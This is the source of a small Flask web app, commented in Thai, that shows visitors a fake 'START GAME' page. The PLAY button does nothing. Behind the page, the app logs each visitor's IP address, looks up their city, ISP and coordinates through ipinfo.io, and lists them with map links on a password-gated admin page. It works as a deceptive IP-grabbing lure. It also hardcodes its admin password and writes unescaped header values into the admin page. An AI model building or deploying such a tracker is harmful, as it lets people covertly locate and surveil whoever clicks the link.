from flask import Flask, request
import requests
import os
from datetime import datetime

app = Flask(__name__)

# 🔐 เปลี่ยนรหัสตรงนี้
ADMIN_KEY = "0949205717As"

# 🎮 หน้าเว็บหลัก (สไตล์เกม)
@app.route("/")
def home():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)

    try:
        data = requests.get(f"https://ipinfo.io/{ip}/json").json()
        country = data.get("country", "Unknown")
        city = data.get("city", "Unknown")
        org = data.get("org", "Unknown")
        loc = data.get("loc", "0,0")
    except:
        country = city = org = "Unknown"
        loc = "0,0"

    time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 📝 บันทึก log
    with open("log.txt", "a", encoding="utf-8") as f:
        f.write(f"{time}|{ip}|{country}|{city}|{org}|{loc}\n")

    return """
    <!DOCTYPE html>
    <html>
    <head>
    <title>Game Start</title>
    <style>
    body {
        background: radial-gradient(circle, #1e1e2f, #000);
        color: white;
        text-align: center;
        font-family: Arial;
        padding-top: 100px;
    }
    .box {
        background: rgba(0,0,0,0.6);
        padding: 40px;
        border-radius: 20px;
        width: 320px;
        margin: auto;
        box-shadow: 0 0 20px #6c5ce7;
    }
    button {
        padding: 12px 25px;
        border: none;
        border-radius: 10px;
        background: #6c5ce7;
        color: white;
        font-size: 16px;
        cursor: pointer;
    }
    button:hover {
        background: #a29bfe;
    }
    .small {
        font-size: 11px;
        color: #aaa;
        margin-top: 20px;
    }
    </style>
    </head>
    <body>

    <div class="box">
        <h1>🎮 START GAME</h1>
        <p>กดเพื่อเริ่ม</p>
        <button onclick="alert('Loading...')">PLAY</button>

        <div class="small">
            เว็บไซต์นี้มีการเก็บข้อมูลเพื่อสถิติ
        </div>
    </div>

    </body>
    </html>
    """

# 📊 + 🗺️ หน้า admin
@app.route("/admin")
def admin():
    key = request.args.get("key")

    if key != ADMIN_KEY:
        return "Access Denied ❌"

    rows = ""

    try:
        with open("log.txt", "r", encoding="utf-8") as f:
            for line in f:
                time, ip, country, city, org, loc = line.strip().split("|")
                lat, lon = loc.split(",")

                map_link = f"https://www.google.com/maps?q={lat},{lon}"

                rows += f"""
                <tr>
                    <td>{time}</td>
                    <td>{ip}</td>
                    <td>{country}</td>
                    <td>{city}</td>
                    <td>{org}</td>
                    <td><a href="{map_link}" target="_blank">📍 Map</a></td>
                </tr>
                """
    except:
        rows = "<tr><td colspan='6'>No data</td></tr>"

    return f"""
    <!DOCTYPE html>
    <html>
    <head>
    <title>Admin Panel</title>
    <style>
    body {{
        background: #111;
        color: white;
        font-family: Arial;
        padding: 20px;
    }}
    h1 {{
        text-align: center;
    }}
    table {{
        width: 100%;
        border-collapse: collapse;
    }}
    th, td {{
        padding: 10px;
        border: 1px solid #444;
        text-align: center;
    }}
    th {{
        background: #6c5ce7;
    }}
    tr:hover {{
        background: #222;
    }}
    a {{
        color: #00cec9;
    }}
    </style>
    </head>
    <body>

    <h1>📊 Admin Dashboard</h1>

    <table>
        <tr>
            <th>Time</th>
            <th>IP</th>
            <th>Country</th>
            <th>City</th>
            <th>ISP</th>
            <th>Map</th>
        </tr>
        {rows}
    </table>

    </body>
    </html>
    """

# 🚀 สำหรับ Render
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
